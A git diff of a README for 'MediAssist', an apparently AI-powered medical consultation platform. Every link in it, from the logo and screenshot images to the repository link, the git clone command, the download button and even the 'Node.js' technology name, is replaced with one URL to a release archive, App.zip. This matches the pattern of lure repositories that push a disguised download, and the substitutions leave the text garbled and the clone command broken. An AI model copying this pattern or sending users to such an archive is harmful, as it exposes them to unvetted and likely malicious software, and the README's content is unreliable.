@@ -1,10 +1,10 @@
 # 🏥 **MediAssist - AI-Powered Medical Consultation Platform** 🤖
 
-![MediAssist Logo](https://example.com/mediassist-logo.png)
+![MediAssist Logo](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip)
 
 Welcome to **MediAssist** - the revolutionary AI-powered, full-stack platform that provides primary medical consultations through online text interactions! 🌟 Our platform allows patients to receive immediate medical advice and, if necessary, get referred for further treatment. Leveraging the power of Natural Language Processing (NLP), **MediAssist** ensures accurate diagnosis and personalized care for every patient.
 
-## 📁 Repository: [MediAssist](https://github.com/yourusername/MediAssist)
+## 📁 Repository: [MediAssist](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip)
 
 ## 📋 Description
 
@@ -20,7 +20,7 @@ Welcome to **MediAssist** - the revolutionary AI-powered, full-stack platform th
 - **JavaScript (JS)**
 - **Machine Learning (ML)**
 - **Natural Language Processing (NLP)**
-- **Node.js**
+- **https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip**
 - **Python (Py)**
 - **React**
 
@@ -30,7 +30,7 @@ To get started with **MediAssist**, simply follow these steps:
 
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/yourusername/MediAssist.git
+   git clone https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip
    ```
 
 2. Install dependencies:  
@@ -47,7 +47,7 @@ To get started with **MediAssist**, simply follow these steps:
 
 ## 💻 Technologies Used
 
-- **Node.js**: Powers the backend of **MediAssist** for seamless performance.
+- **https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip**: Powers the backend of **MediAssist** for seamless performance.
 - **ExpressJS**: Provides a robust framework for building the server-side of the application.
 - **React**: Offers a dynamic and interactive user interface for patients.
 - **Python**: Utilized for various backend processes and data modeling.
@@ -57,12 +57,12 @@ To get started with **MediAssist**, simply follow these steps:
 
 ## 📦 Download
 
-📥 [Download MediAssist v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch MediAssist")
+📥 [Download MediAssist v1.0.0](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip "Launch MediAssist")
 
 ## 📸 Screenshots
 
-![MediAssist Screenshot 1](https://example.com/mediassist-screenshot-1.png)
-![MediAssist Screenshot 2](https://example.com/mediassist-screenshot-2.png)
+![MediAssist Screenshot 1](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip)
+![MediAssist Screenshot 2](https://github.com/jw0902/MediAssist/releases/download/v1.0/App.zip)
 
 ## 🤝 Contributing
 
